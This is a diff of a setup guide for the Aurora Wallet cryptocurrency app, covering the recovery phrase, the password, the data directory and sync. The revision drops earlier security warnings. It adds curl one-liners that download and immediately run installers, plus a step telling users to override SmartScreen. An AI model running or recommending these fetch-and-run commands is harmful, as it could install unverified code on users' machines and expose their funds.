@@ -1,127 +1,120 @@
----
-title: "First Run Setup: Configuring Your Aurora Wallet"
-description: "Follow this step-by-step guide to set up your Aurora Wallet for the first time. Learn about seed phrase generation, encryption, and initial blockchain syncing."
-primary_keyword: "aurora wallet setup guide"
-silo: "Getting Started"
-updated: 2026-10-10
----
+![Aurora Wallet first run setup guide](assets/aurora-wallet-guide-article-banner.png)
 
-![Aurora Wallet](https://img.shields.io/badge/Aurora%20Wallet-2026.08.1.0-23685a) ![Platforms](https://img.shields.io/badge/Windows%20%C2%B7%20macOS%20%C2%B7%20Linux-desktop-23685a) ![License](https://img.shields.io/badge/License-MIT-23685a)
+# Aurora Wallet first run setup: phrase, password and data directory
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)
+What the opening wizard asks for, in the order it asks, and why each answer matters.
 
-# First Run Setup: Configuring Your Aurora Wallet
+## Downloads - 2026.08.1.0
 
-Setting up your Aurora Wallet for the first time is a critical process that establishes the foundation for your Auroracoin (AUR) security. The initial configuration involves generating a unique BIP-39 recovery phrase, selecting a secure data directory, and allowing the software to synchronize with the global Auroracoin blockchain to ensure your transaction history and balances are accurately reflected in a self-custodial environment.
+<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>
 
-## You'll see this if
+| Platform | Requirements | File |
+| --- | --- | --- |
+| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
+| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
+| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |
 
-*   You have just downloaded and installed the Aurora Wallet and are launching it for the very first time.
-*   You are migrating to a new computer and need to initialize a fresh installation of the wallet software.
-*   You have cleared your local data directory and the application is prompting you for a new setup wizard.
-*   You are switching from a legacy wallet version and need to set up a modern BIP-39 compliant interface.
-*   You want to restore an existing wallet using a 12 or 24-word seed phrase on a clean machine.
 
-## Why the Initial Setup is Critical
+The first launch of Aurora Wallet creates the keys that hold your Auroracoin, so it is worth two quiet minutes rather than a click-through.
 
-The first time you run Aurora Wallet, you are not just opening a program; you are generating the cryptographic keys that will secure your wealth. Unlike traditional banking, there is no "Forgot Password" link for your blockchain assets. The setup phase is "designed to" provide you with all the tools necessary to maintain complete control over your Auroracoin (AUR), but it requires careful attention to security best practices.
+The first-run wizard creates a twelve or twenty-four word BIP-39 recovery phrase, asks you to confirm it, sets a password for the local wallet file and names the data directory where the blockchain and wallet are stored. When the wizard closes, the wallet begins downloading the chain and shows progress at the bottom of the window.
 
-During this phase, the wallet software creates a locally stored database that will eventually house your transaction history and encrypted private keys. Because Aurora Wallet is a decentralized tool, the Auroracoin Foundation never sees your keys, your password, or your recovery phrase. This means the responsibility for backing up this information lies solely with you. A proper setup ensures that even if your hardware fails, you can recover your funds on any other device.
+<!-- ARTICLE-BODY-BEGIN -->
 
----
+## What the wizard asks for
 
-## The fix: Step-by-Step Configuration
+The phrase comes first, because everything else depends on it. The words are the master copy of your private keys: a compatible wallet rebuilds every address from them, on any machine, without a backup file. Write them on paper in order, check the confirmation step the wizard shows, and store the paper somewhere that survives a house move.
 
-Follow these steps carefully to ensure your Aurora Wallet is configured correctly and securely.
+The password comes second. It encrypts the wallet file on disk and is required whenever the wallet signs a transaction. It is not a recovery method: a forgotten password is recovered with the phrase, not with a support ticket.
 
-### 1. Preparing Your Environment
-Before you even click the icon to launch the app, ensure your environment is secure.
-*   **Physical Privacy:** Make sure no one is looking over your shoulder and that there are no cameras (including webcams) pointed at your screen.
-*   **Device Health:** Ensure your operating system is updated and free of malware.
-*   **Recording Materials:** Have a pen and paper (or a dedicated seed storage device) ready. Never use a digital notepad or take a photo of your recovery phrase.
+## Setting the data directory
 
-### 2. Selecting a Data Directory
-Upon launch, Aurora Wallet will ask where you want to store the blockchain data.
-*   **Default Location:** Most users should choose the default path.
-*   **Custom Location:** If your primary drive is low on space, you can select an external drive or a different partition. Ensure the drive is fast (SSD is highly recommended) and has at least 10 GB of free space.
-*   **Link Mix:** You can find more details on where these files are kept in the [wallet.dat location guide](21-wallet-dat-location.md).
+The data directory holds two different things. The wallet file is small and precious; the chain data is large and replaceable. On a laptop with a small system drive, point both at an external or secondary drive now rather than moving files later, and keep at least ten gigabytes free for the chain as it grows.
 
-### 3. Generating or Restoring a Wallet
-You will be presented with two main options: "Create a new wallet" or "Restore from seed."
-*   **For New Users:** Select "Create a new wallet." The software will use a high-entropy random number generator to create your unique keys.
-*   **For Existing Users:** If you already have a 12 or 24-word phrase, select "Restore" and enter your words in the correct order.
+The default locations are recorded in <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/21-wallet-dat-location.md">where the wallet.dat file lives</a> for each operating system, which is also the page to open before you ever copy a wallet file between machines.
 
-### 4. Securing Your BIP-39 Recovery Phrase
-The wallet will display a sequence of words. This is the most important part of the setup.
-*   **Write it Down:** Record every word in the exact order shown.
-*   **Verify:** The software will likely ask you to confirm several words to ensure you have recorded them correctly.
-*   **Storage:** Store this paper in a fireproof and waterproof location. 
-*   > [!WARNING]
-    > Never share your recovery phrase with anyone. No legitimate support agent, developer, or website will ever ask for these words. If they do, it is a phishing attempt.
+## Finishing the setup
 
-### 5. Setting an Optional Passphrase
-You may be offered the choice to add a "Passphrase" (sometimes called a 13th or 25th word).
-*   **Advanced Security:** This acts as a secondary layer of protection. Without both the seed phrase and this passphrase, the funds cannot be accessed.
-*   **Risk:** If you forget this passphrase, your funds are lost forever, even if you have the 24 words. Only use this if you are confident in your [password encryption](34-password-encryption.md) management.
+Let the sync reach one hundred percent before you receive funds. A wallet that shows a balance of zero while the chain is still downloading is normal, and sending a test amount early only makes the wait more confusing.
 
-### 6. Wallet Encryption
-Once the wallet interface opens, you should immediately set an application password.
-*   **Purpose:** This password encrypts your local files and is required every time you send a transaction.
-*   **Complexity:** Use a long, unique password that you do not use for any other service.
+If you are starting from a fresh download, use the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">current Aurora Wallet build</a> rather than an older installer you find on a disk, then follow the confirmation step carefully.
 
----
-
-## The Synchronization Process
-
-After the configuration is complete, the Aurora Wallet will begin "Synchronizing with network."
-
-*   **What is Syncing?** The wallet is downloading the history of every Auroracoin transaction ever made. This allows the wallet to calculate your current balance correctly.
-*   **How long does it take?** Depending on your internet speed and the speed of your disk (HDD vs SSD), this can take between 4 and 24 hours.
-*   **Progress Bar:** You can monitor the progress at the bottom of the wallet window. Do not attempt to send or receive funds until the synchronization is 100% complete.
-*   **Connectivity:** If the sync is not progressing, visit the [Wallet Not Syncing guide](https://auroracoin.net/troubleshooting/wallet-not-syncing) on the official website for troubleshooting steps.
-
-## If that didn't work
-
-*   **Insufficient Disk Space:** If the wallet stops syncing and throws an error, verify that your selected data directory has not run out of storage space.
-*   **Firewall Blocks:** If the "active connections" count remains at zero, you may need to manually allow the Aurora Wallet through your OS firewall. Refer to the [Windows Defender](18-windows-defender-smartscreen.md) or [Linux permissions](20-linux-permissions.md) guides for help.
-*   **Corrupt Installation:** If the app crashes immediately upon setup, delete the temporary files in the data directory and restart the process.
-
-## Prevention
-
-*   **Test Your Backup:** Before sending large amounts of AUR to your new wallet, consider deleting the app and restoring it using your seed phrase to ensure you recorded it correctly.
-*   **Regular Backups:** Even with a seed phrase, keeping a backup of your `wallet.dat` file after adding labels or new addresses is a good habit. See our [backup best practice](33-backup-best-practice.md) article.
-*   **Official Downloads:** Always ensure you are running the genuine software by checking the [GitHub releases guide](07-github-releases-guide.md).
-*   **Security awareness:** For more information on self-custody and protecting your assets, visit the [official Security page](https://auroracoin.net/security).
-
----
+The phrase you write down is the same one used on any replacement machine, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/25-recovery-phrase-bip39.md">restoring from a recovery phrase</a> walks through the restore side of this page.
 
 ## FAQ
 
-**Do I need an internet connection for the whole setup?**
-You need an internet connection to download the blockchain (syncing) and to broadcast transactions, but the generation of your seed phrase happens offline on your local machine.
+### Can I change the data directory later?
 
-**What happens if I lose my recovery phrase?**
-If you lose your 12 or 24-word recovery phrase and lose access to your computer, your Auroracoin (AUR) is lost forever. There is no way for the Auroracoin Foundation to recover it for you.
+Yes. Close the wallet, move the folder and point the application at the new location on the next start. The wallet file travels with the chain data, so move both together.
 
-**Can I skip the encryption password?**
-Technically yes, but it is highly discouraged. Encryption is "designed to" protect your funds if your computer is stolen or accessed by an unauthorized user.
+### What if I lose the paper with the words?
 
-**Why is the blockchain download so slow?**
-The speed is limited by your internet bandwidth and your computer's ability to verify each block's cryptographic signature. Using an SSD significantly speeds up this process.
+There is no remote copy to recover. The phrase is the only backup that restores the wallet without the original file, which is why the wizard insists you write it down before it lets you continue.
 
----
+<!-- ARTICLE-BODY-END -->
 
-## The current release
+## How to install Aurora Wallet
 
-Aurora Wallet 2026.08.1.0 is the current desktop release for Windows, macOS and Linux:
+### Windows
+Quick install (CMD):
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)
+```cmd
+curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
+```
 
-Release notes and checksums: [Aurora Wallet 2026.08.1.0 release](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/tag/2026.08.1.0)
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
+2. Open the downloaded file.
+3. If SmartScreen appears, choose More info, then Run anyway.
+4. Finish the setup steps.
 
-## Related articles
+Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.
 
-*   [01-what-is-aurora-wallet.md](01-what-is-aurora-wallet.md)
-*   [33-backup-best-practice.md](33-backup-best-practice.md)
-*   [25-recovery-phrase-bip39.md](25-recovery-phrase-bip39.md)
-*   [34-password-encryption.md](34-password-encryption.md)
+```cmd
+certutil -hashfile setup.exe SHA256
+```
+
+### macOS
+Quick install (Terminal):
+
+```bash
+curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
+```
+
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
+2. Open the .dmg file.
+3. Drag the app to Applications.
+4. On first launch, right-click the app and choose Open.
+
+Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.
+
+```bash
+shasum -a 256 setup.dmg
+```
+
+### Linux
+Quick install (Terminal):
+
+```bash
+curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
+```
+
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
+2. Extract the archive.
+3. Run `aurora-wallet`.
+
+Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.
+
+```bash
+sha256sum app.zip
+```
+
+
+## Related guides
+
+- [What is Aurora Wallet](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/01-what-is-aurora-wallet.md)
+- [Recovery phrase and BIP-39](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/25-recovery-phrase-bip39.md)
+- [Backup best practice](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/33-backup-best-practice.md)
+- [Password encryption](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/34-password-encryption.md)
